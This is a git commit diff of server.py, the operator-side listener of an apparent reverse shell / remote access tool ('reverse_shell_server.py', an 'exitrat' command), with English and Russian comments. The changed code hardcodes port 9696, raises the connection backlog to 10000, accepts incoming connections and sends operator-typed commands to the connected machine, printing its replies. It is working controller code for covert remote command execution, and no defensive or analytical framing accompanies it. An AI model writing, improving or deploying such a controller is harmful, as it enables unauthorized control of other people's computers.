becb138eb5642deaa68f0e71f7c1300b5eab282f
miclay0260 <79045167+miclay0260@users.noreply.github.com>
2021-02-20 09:45:14 +0400

    Update server.py

--- server.py
+++ server.py
@@ -1,32 +1,24 @@
 import socket
 import sys
 import os
-import tqdm
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 HOST = ''
-
-# Check if port to listen was entered / Проверка был ли введен порт для прослушивания
-try:
-    PORT = int(sys.argv[1])
-except Exception as ex:
-    print('Usage: python3 reverse_shell_server.py <port>\n' + str(ex))
-    sys.exit(1)
+PORT = 9696
 
 
 def main():
     # Start to listen and wait for connect / Ожидание подключения
     s.bind((HOST, PORT))
-    s.listen(10)
-    print('RSBF server listening on port {}...'.format(PORT))
-
+    s.listen(10000)
+    print('Server listening on port 9696')
     # Accept connection / Принятие подключения
-    conn, _ = s.accept()
-
+    conn, addr = s.accept()
+    print('[+] ' + str(addr))
     # Command processor / Обработчик команд
     while True:
         # Variable with command / Переменная с командой
-        cmd = input('RSBF> ').rstrip()
+        cmd = input('[CONSOLE] -> ').rstrip()
 
         # If command = nothing - continue loop / Если команда ничему не равна -  продолжаем цикл
         if cmd == '':
@@ -38,12 +30,11 @@ def main():
         # Stop server / Останавливаем сервер
         if cmd == 'exitrat':
             s.close()
-            sys.exit(0)
-
-        # Variable with client answer / Переменная с ответом от сервера
-        data = conn.recv(4096)
-        print(str(data, encoding="utf-8", errors="ignore"))
-
+            exit()
+        else:
+            # Variable with client answer / Переменная с ответом от сервера
+            data = conn.recv(4096)
+            print(str(data, encoding="utf-8", errors="ignore"))
 
 if __name__ == '__main__':
     main()
